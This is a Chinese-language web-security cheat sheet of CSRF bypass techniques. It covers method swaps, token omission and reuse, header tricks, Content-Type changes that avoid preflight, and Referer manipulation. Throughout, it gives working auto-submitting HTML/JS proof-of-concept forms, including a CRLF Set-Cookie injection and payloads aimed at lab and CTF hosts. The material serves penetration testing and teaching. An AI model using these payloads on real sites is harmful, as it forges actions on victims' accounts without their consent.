# CSRF绕过

### POST-GET

如果请求表单为POST请求，但也应该检测GET请求是否也有效，以及当发送GET请求时CSRF令牌是否仍在验证.

### HEAD方法绕过

如果GET请求受到限制,可以只发送一个HEAD请求,该请求将作为GET请求进行处理.

### CSRF令牌缺少

WEB应用程序可能会实现一种机制来验证令牌。如果令牌不存在时则完全跳过验证.

攻击者可以通过删除携带令牌的参数来利用此漏洞.

### CSRF令牌不与用户会话绑定

没有将CSRF令牌绑定到用户会话的WEB应用程序的情况下,系统根据全局池验证令牌,而不是确保每个令牌都绑定到发起的会话.

攻击者可以通过使用自己的账户进行身份验证,然后从全局池中获取有效的CSRF令牌,最后针对受害者发起CSRF攻击使用此令牌.

### 方法绕过

奇怪的请求方法可能导致目标WEB应用程序无法识别.

比如PUT请求
```javascript
<script>
function put() {
    var x = new XMLHttpRequest();
    x.open("PUT","http://目标WEB应用程序/",true);
    x.setRequestHeader("Content-Type", "application/json");
    x.send(JSON.stringify({"acct":"BOB", "amount":100}));
}
</script>

<body onload="put()">
```

### 自定义标头令牌绕过

如果请求将带有令牌的自定义标头添加到请求中作为CSRF防御机制,那么可以尝试

+ 在没有自定义令牌和标头的情况下测试请求
+ 使用完全相同的长度但不同的token测试请求

### CSRF令牌通过cookie进行验证

应用程序可以通过在 cookie 和请求参数中复制令牌或设置 CSRF cookie 并验证后端发送的令牌是否与 cookie 相对应来实现 CSRF 保护. 应用程序通过检查请求参数中的令牌是否与 cookie 中的值一致来验证请求.

但是，如果网站存在允许攻击者在受害者浏览器中设置 CSRF cookie 的缺陷（例如 CRLF 漏洞），则此方法很容易受到 CSRF 攻击. 攻击者可以通过加载设置 cookie 的欺骗性图像来利用此漏洞，然后发起 CSRF 攻击.

```javascript
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://example.com/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
      <input type="hidden" name="csrf" value="tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="https://example.com/?search=term%0d%0aSet-Cookie:%20csrf=tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" onerror="document.forms[0].submit();"/>
  </body>
</html>
```

### 内容类型更改

为了避免POST请求被进行预检测,可以设置允许的Content-Type值

+ application/x-www-form-urlencoded
+ multipart/form-data
+ text/plain
+ application/json
+ text/xml
+ application/xml

以纯文本方式发送Json数据
```html
<html>
  <body>
    <form id="form" method="post" action="https://phpme.be.ax/" enctype="text/plain">
      <input name='{"garbageeeee":"' value='", "yep": "yep yep yep", "url": "https://webhook/"}'>
    </form>
    <script>
        form.submit();
    </script>
  </body>
</html>
```

### 绕过JSON数据的预检请求

当尝试通过 POST 请求发送 JSON 数据时，无法直接在 HTML 表单中使用 Content-Type: application/json. 同样，利用 XMLHttpRequest 发送此内容类型会启动预检请求。 尽管如此，还是有一些策略可以绕过此限制并检查服务器是否处理 JSON 数据，而不管内容类型如何：

+ 使用替代内容类型：通过在表单中设置 enctype="text/plain" 来使用 Content-Type: text/plain 或 Content-Type: application/x-www-form-urlencoded.此方法测试后端是否使用数据，无论内容类型如何

+ 修改内容类型：为了避免预检请求，同时确保服务器将内容识别为 JSON，您可以使用 Content-Type: text/plain 发送数据； 应用程序/json. 这不会触发预检请求，但如果服务器配置为接受 application/json，则可能会被服务器正确处理

+ SWF Flash 文件利用：一种不太常见但可行的方法是使用 SWF Flash 文件来绕过此类限制

### Referrer/Origin 绕过

仅当Referrer标头存在时,WEB应用程序才会验证.为了防止浏览器发送此标头,可以使用HTML标签:
```javascript
<meta name="referrer" content="never">
```

若要在Referrer参数内发送的URL设置服务器域名,可以编辑代码如下:
```html
<html>
  <head><meta name="referrer" content="unsafe-url"></head>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://ac651f671e92bddac04a2b2e008f0069.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState("", "", "?ac651f671e92bddac04a2b2e008f0069.web-security-academy.net")
      document.forms[0].submit();
    </script>
  </body>
</html>
```
